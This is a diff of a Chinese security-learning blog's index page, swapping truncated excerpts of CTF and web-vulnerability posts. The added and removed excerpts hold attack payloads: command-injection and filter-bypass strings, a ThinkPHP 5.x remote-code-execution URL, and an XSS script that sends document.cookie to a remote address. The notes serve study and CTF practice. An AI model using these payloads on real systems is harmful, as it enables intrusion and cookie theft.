@@ -204,7 +204,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">89</div>
+    <div class="sidebar-state-number">85</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -212,7 +212,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">66</div>
+    <div class="sidebar-state-number">62</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -268,134 +268,6 @@
 
           <section id="main">
   
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/03/05/BaseCTF2024/" aria-label="BaseCTF2024"></a>
-    
-    
-    <div class="post-cover-left">
-      
-        <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="BaseCTF2024" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-05</span>
-        <span><span class="icon-pencil"></span>6.5k 字</span>
-        <span><span class="icon-clock"></span>32 分钟</span>
-      </div>
-      <h2 class="post-title">BaseCTF2024</h2>
-      <article class="post-article">
-        
-          A Dark Room查看源代码
-upload上传一个php文件
-里面写有一句话木马
-蚁剑连接
-ez
-HTTP是什么呀按要求改请求头就行
-喵喵喵命令执行读取flag.php
-?DT&amp;#x3D;system(cat &amp;#x2F;flag)
-MD5绕过欸MD5可以全部用数组绕过
-a[]&amp;#x3D;1&amp;amp;b[]&amp;#x3D;2…
-一起吃豆豆查看源代码
-
-在index.php里面找游戏结束的代码，发现一串base64编码，解码
-flag到手
-flag直接读取不就行了？考察php原生类
-1234567891011121314&amp;lt;?phphighlight_file(&amp;#x27;index.php
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/03/04/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" aria-label="命令执行绕过姿势"></a>
-    
-    
-    <div class="post-cover-right">
-      
-        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="命令执行绕过姿势" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-04</span>
-        <span><span class="icon-pencil"></span>3.9k 字</span>
-        <span><span class="icon-clock"></span>17 分钟</span>
-      </div>
-      <h2 class="post-title">命令执行绕过姿势</h2>
-      <article class="post-article">
-        
-          小知识12345include不用括号，分号可以用?&amp;gt;代替。 //c=include$_GET[1]?&amp;gt;&amp;amp;1=data://text/plain,&amp;lt;?php system(&amp;quot;cat flag.php&amp;quot;);?&amp;gt;若想截断后面语句：%0a、%26、||&amp;lt;、&amp;lt;&amp;gt;、$&amp;#123;IFS&amp;#125;可以绕过空格过滤
-
-无过滤：12345678910111213141516171819通配符payload1:c=system(&amp;quot;nl fla?????&amp;quot;);payload2:c=system(&amp;quot;nl fla*&amp;
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/02/28/php%E5%8E%9F%E7%94%9F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%B1%BB/" aria-label="php原生文件操作类"></a>
-    
-    
-    <div class="post-cover-left">
-      
-        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="php原生文件操作类" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-28</span>
-        <span><span class="icon-pencil"></span>830 字</span>
-        <span><span class="icon-clock"></span>3 分钟</span>
-      </div>
-      <h2 class="post-title">php原生文件操作类</h2>
-      <article class="post-article">
-        
-           我在做一个ctf新手题的时候遇到了此概念
-这类概念在反序列化中用到相对多一点
-例题先看这题源码
-1234567891011121314&amp;lt;?phphighlight_file(&amp;#x27;index.php&amp;#x27;);# 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~error_reporting(0);$J1ng = $_POST[&amp;#x27;J&amp;#x27;];$Hong = $_POST[&amp;#x27;H&amp;#x27;];$Keng = $_GET[&amp;#x27;K&amp;#x27;];$Wang = $_GET[&amp;#x27;W&amp;#x27;];$dir = new $Ken
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/02/24/php%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7/" aria-label="php常用特性"></a>
-    
-    
-    <div class="post-cover-right">
-      
-        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="php常用特性" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-24</span>
-        <span><span class="icon-pencil"></span>8.4k 字</span>
-        <span><span class="icon-clock"></span>39 分钟</span>
-      </div>
-      <h2 class="post-title">php常用特性</h2>
-      <article class="post-article">
-        
-          常见php函数12345678910substr(string,start,length)  //截取字符串strrev(string $string) //反转字符串FilesystemIterator   //获取目录文件FilesystemIteratortrim()         //用于去除字符串两端的空白字符或其他指定字符。getcwd()函数    //取得当前工作目录getcwd()函数strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）stripos() -查找字符串在另一字符串中第一次出现的位置（不区分大小写）strrpos() - 查找字符串在另
-        
-      </article>
-    </div>
-  </div>
-</div>
   
     <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
@@ -584,6 +456,147 @@ Csrf(跨站请求伪造)攻击思想攻击者诱使在一个网站上已经登�
   </div>
 </div>
   
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/02/14/ssrf/" aria-label="Ssrf"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        
+        
+          <img data-src="../images/126839103p0master1200.jpg" data-sizes="auto" alt="Ssrf" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-02-14</span>
+        <span><span class="icon-pencil"></span>4.7k 字</span>
+        <span><span class="icon-clock"></span>20 分钟</span>
+      </div>
+      <h2 class="post-title">Ssrf</h2>
+      <article class="post-article">
+        
+          简介SSRF (Server-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统(正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统)。
+即利用服务器的权限去请求一些其他的非法内容
+借鉴：
+SSRF全详解-CSDN博客
+危害能扫描内部网络，获取端口，服务信息。攻击运行在内网或本地的应用程序。对内网web进行指纹识别对内部主机和端口发送请求包进行攻击file协议读取本地文件
+相关函数file_get_contents()可以读取本地文件或远程资源的内容，
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/02/12/RCE/" aria-label="RCE"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="RCE" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-02-12</span>
+        <span><span class="icon-pencil"></span>994 字</span>
+        <span><span class="icon-clock"></span>4 分钟</span>
+      </div>
+      <h2 class="post-title">RCE</h2>
+      <article class="post-article">
+        
+          代码执行函数(1) eval()
+功能: 将字符串作为 PHP 代码执行。
+
+风险: 如果用户输入直接传递给 eval()，攻击者可以执行任意代码。
+
+示例:
+  12$code = $_GET[&amp;#x27;code&amp;#x27;]; // 用户输入eval($code); // 危险！用户可以注入恶意代码
+
+(2) assert()
+功能: 用于调试断言，但如果传入字符串，会将其作为 PHP 代码执行。
+
+风险: 在 PHP 7.0 之前，assert() 可以执行代码。
+
+示例:
+  12$value = $_GET[&amp;#x27;value&amp;#x27;]; // 用户输入assert(&amp;qu
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/02/12/thinkphp%20v5.x/" aria-label="thinkphp v5.x"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="thinkphp v5.x" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-02-12</span>
+        <span><span class="icon-pencil"></span>147 字</span>
+        <span><span class="icon-clock"></span>1 分钟</span>
+      </div>
+      <h2 class="post-title">thinkphp v5.x</h2>
+      <article class="post-article">
+        
+          1）在url输出关于 PHP 配置的信息
+index.php?s&amp;#x3D;index&amp;#x2F;\think\app&amp;#x2F;invokefunction&amp;amp;function&amp;#x3D;phpinfo&amp;amp;vars[0]&amp;#x3D;100
+
+2）输入系统命令: whoami
+&amp;#x2F;index.php?s&amp;#x3D;index&amp;#x2F;think\app&amp;#x2F;invokefunction&amp;amp;function&amp;#x3D;call_user_func_array&amp;amp;vars[0]&amp;#x3D;system&amp;amp;vars[1][]&amp;#x3D;whoami
+
+3
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/02/03/XSS-payload%E6%9E%84%E9%80%A0/" aria-label="XSS-payload构造"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="XSS-payload构造" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-02-03</span>
+        <span><span class="icon-pencil"></span>3.1k 字</span>
+        <span><span class="icon-clock"></span>14 分钟</span>
+      </div>
+      <h2 class="post-title">XSS-payload构造</h2>
+      <article class="post-article">
+        
+          黑客是如何获取你账号密码的
+
+漏洞利用：1.盗取cookie：
+&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;2.构造页面跳转：
+&amp;lt;script&amp;gt;location=&amp;#39;https://www.hacker.com&amp;#39;&amp;lt;/script&amp;gt;3.构造获取cookie并发送到远程主机：
+1&amp;lt;script&amp;gt;document.location=&amp;#x27;http://127.0.0.1/test/cookie.phpcookie=&amp;#x27;+document.cookie&amp;lt;/script&amp;gt;
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
 
 
   <nav id="page-nav" data-aos="fade-up">
@@ -617,10 +630,10 @@ Csrf(跨站请求伪造)攻击思想攻击者诱使在一个网站上已经登�
     
       <div>
         <span class="icon-brush"></span>
-        120.8k
+        115.8k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        08:20
+        07:58
       </div>
     
     
@@ -656,7 +669,7 @@ Csrf(跨站请求伪造)攻击思想攻击者诱使在一个网站上已经登�
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">89</div>
+    <div class="sidebar-state-number">85</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -664,7 +677,7 @@ Csrf(跨站请求伪造)攻击思想攻击者诱使在一个网站上已经登�
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">66</div>
+    <div class="sidebar-state-number">62</div>
   </div>
 </div>
 <div class="sidebar-social">
